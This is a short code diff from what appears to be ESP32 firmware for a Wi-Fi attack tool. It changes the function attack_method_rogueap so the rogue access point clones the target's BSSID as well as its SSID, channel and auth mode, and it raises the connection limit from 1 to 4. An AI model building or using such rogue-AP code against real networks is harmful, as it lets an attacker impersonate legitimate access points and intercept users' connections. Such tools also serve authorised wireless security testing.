@@ -69,14 +69,14 @@ static void ip_event_handler(void* arg, esp_event_base_t event_base,
 
 void attack_method_rogueap(const wifi_ap_record_t *ap_record){
     ESP_LOGD(TAG, "Configuring Rogue AP");
-    // wifictl_set_ap_mac(ap_record->bssid);
+    wifictl_set_ap_mac(ap_record->bssid);
     wifi_config_t ap_config = {
         .ap = {
             .ssid_len = strlen((char *)ap_record->ssid),
             .channel = ap_record->primary,
             .authmode = ap_record->authmode,
             .password = "dummypassword",
-            .max_connection = 1
+            .max_connection = 4
         },
     };
     mempcpy(ap_config.ap.ssid, ap_record->ssid, 32);
